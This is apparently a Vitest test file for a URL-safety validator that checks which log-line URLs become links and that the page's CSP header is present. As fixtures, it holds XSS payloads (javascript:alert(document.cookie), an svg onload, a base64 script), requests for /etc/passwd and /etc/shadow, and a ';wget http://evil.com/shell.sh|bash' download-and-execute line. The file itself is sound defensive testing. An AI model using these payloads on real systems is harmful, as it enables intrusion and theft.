import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";

import { SafeUrlValidator } from "@core/pipeline/safe-url-validator";

const currentDirPath = import.meta.dirname;
const indexHtmlPath = path.resolve(currentDirPath, "../../index.html");

describe("Safe URL Protocol Validation & CSP Integrity", () => {
  describe("SafeUrlValidator.isSafeProtocol", () => {
    it("allows standard https URLs", () => {
      expect(SafeUrlValidator.isSafeProtocol("https://attack.mitre.org/techniques/T1110/")).toBe(
        true,
      );
      expect(SafeUrlValidator.isSafeProtocol("https://example.com:8443/api/v1?query=test")).toBe(
        true,
      );
    });

    it("allows standard http URLs", () => {
      expect(SafeUrlValidator.isSafeProtocol("http://example.com/log")).toBe(true);
      expect(SafeUrlValidator.isSafeProtocol("http://evil.com/shell.sh")).toBe(true);
    });

    it("strictly rejects javascript: pseudo-protocols with arbitrary payloads", () => {
      expect(SafeUrlValidator.isSafeProtocol("javascript:alert(1)")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("JAVASCRIPT:alert(document.cookie)")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("javascript:void(0)")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("javascript:window.location='http://evil.com'")).toBe(
        false,
      );
    });

    it("strictly rejects data: pseudo-protocols", () => {
      expect(
        SafeUrlValidator.isSafeProtocol(
          "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ),
      ).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("data:image/svg+xml,<svg onload=alert(1)>")).toBe(
        false,
      );
      expect(SafeUrlValidator.isSafeProtocol("DATA:text/plain;charset=utf-8,malicious")).toBe(
        false,
      );
    });

    it("strictly rejects other dangerous protocols like vbscript, file, blob", () => {
      expect(SafeUrlValidator.isSafeProtocol("vbscript:msgbox(1)")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("file:///etc/passwd")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("blob:https://example.com/uuid")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("about:blank")).toBe(false);
    });

    it("detects and rejects obfuscated pseudo-protocols containing whitespace and control characters", () => {
      expect(SafeUrlValidator.isSafeProtocol("java\0script:alert(1)")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("  javascript : alert(1)  ")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("jav\tascript:alert(1)")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("\r\njavascript:evil()")).toBe(false);
    });

    it("rejects non-url or relative strings", () => {
      expect(SafeUrlValidator.isSafeProtocol("/admin/dashboard")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("//example.com")).toBe(false);
      expect(SafeUrlValidator.isSafeProtocol("")).toBe(false);
    });
  });

  describe("SafeUrlValidator.getSafeHref", () => {
    it("returns unmodified valid http and https URLs", () => {
      expect(SafeUrlValidator.getSafeHref("https://example.com")).toBe("https://example.com");
      expect(SafeUrlValidator.getSafeHref("http://example.com/test")).toBe(
        "http://example.com/test",
      );
    });

    it("resolves valid domain names to safe https URLs", () => {
      expect(SafeUrlValidator.getSafeHref("example.com")).toBe("https://example.com");
      expect(SafeUrlValidator.getSafeHref("c2.attacker.org/beacon")).toBe(
        "https://c2.attacker.org/beacon",
      );
    });

    it("returns null for forbidden pseudo-protocols", () => {
      expect(SafeUrlValidator.getSafeHref("javascript:alert(1)")).toBeNull();
      expect(SafeUrlValidator.getSafeHref("data:text/html,<script>alert(1)</script>")).toBeNull();
      expect(SafeUrlValidator.getSafeHref("vbscript:run()")).toBeNull();
      expect(SafeUrlValidator.getSafeHref("file:///etc/shadow")).toBeNull();
    });

    it("returns null for malformed or non-domain inputs", () => {
      expect(SafeUrlValidator.getSafeHref("")).toBeNull();
      expect(SafeUrlValidator.getSafeHref("not a url")).toBeNull();
    });
  });

  describe("SafeUrlValidator.tokenizeLogLine", () => {
    it("recognizes safe http and https URLs and generates links", () => {
      const line =
        '10.0.0.1 - - [23/Sep/2026:14:00:02 +0000] "GET / HTTP/1.1" 200 2345 "http://example.com/"';
      const tokens = SafeUrlValidator.tokenizeLogLine(line);
      const linkToken = tokens.find((t) => t.isLink);

      expect(linkToken).toBeDefined();
      expect(linkToken?.text).toBe("http://example.com/");
      expect(linkToken?.href).toBe("http://example.com/");
    });

    it("recognizes domains and generates safe https links", () => {
      const line = "connect to c2.attacker.org port 443";
      const tokens = SafeUrlValidator.tokenizeLogLine(line);
      const linkToken = tokens.find((t) => t.isLink);

      expect(linkToken).toBeDefined();
      expect(linkToken?.text).toBe("c2.attacker.org");
      expect(linkToken?.href).toBe("https://c2.attacker.org");
    });

    it("refuses to create links for javascript: pseudo-protocols", () => {
      const line = 'GET /login?redirect=javascript:alert(1) HTTP/1.1" 200';
      const tokens = SafeUrlValidator.tokenizeLogLine(line);

      const links = tokens.filter((t) => t.isLink);
      expect(links).toHaveLength(0);

      const jsToken = tokens.find((t) => t.text.includes("javascript:alert(1)"));
      expect(jsToken).toBeDefined();
      expect(jsToken?.isLink).toBe(false);
      expect(jsToken?.href).toBeUndefined();
    });

    it("refuses to create links for data: pseudo-protocols", () => {
      const line =
        'POST /api/upload HTTP/1.1" payload="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="';
      const tokens = SafeUrlValidator.tokenizeLogLine(line);

      const links = tokens.filter((t) => t.isLink);
      expect(links).toHaveLength(0);

      const dataToken = tokens.find((t) => t.text.includes("data:text/html;base64"));
      expect(dataToken).toBeDefined();
      expect(dataToken?.isLink).toBe(false);
      expect(dataToken?.href).toBeUndefined();
    });

    it("isolates command delimiters and punctuation from URL tokens", () => {
      const line = ";wget http://evil.com/shell.sh|bash";
      const tokens = SafeUrlValidator.tokenizeLogLine(line);
      const linkToken = tokens.find((t) => t.isLink);

      expect(linkToken).toBeDefined();
      expect(linkToken?.text).toBe("http://evil.com/shell.sh");
      expect(linkToken?.href).toBe("http://evil.com/shell.sh");
    });
  });

  describe("index.html Content-Security-Policy Meta Tag Verification", () => {
    it("contains the exact CSP meta tag restricting scripts and external resources", () => {
      const content = fs.readFileSync(indexHtmlPath, "utf-8");

      expect(content).toContain('http-equiv="Content-Security-Policy"');
      expect(content).toMatch(
        /content="default-src 'self'; script-src 'self'; connect-src 'self' blob:; style-src 'self' 'unsafe-inline';"/,
      );
    });
  });
});
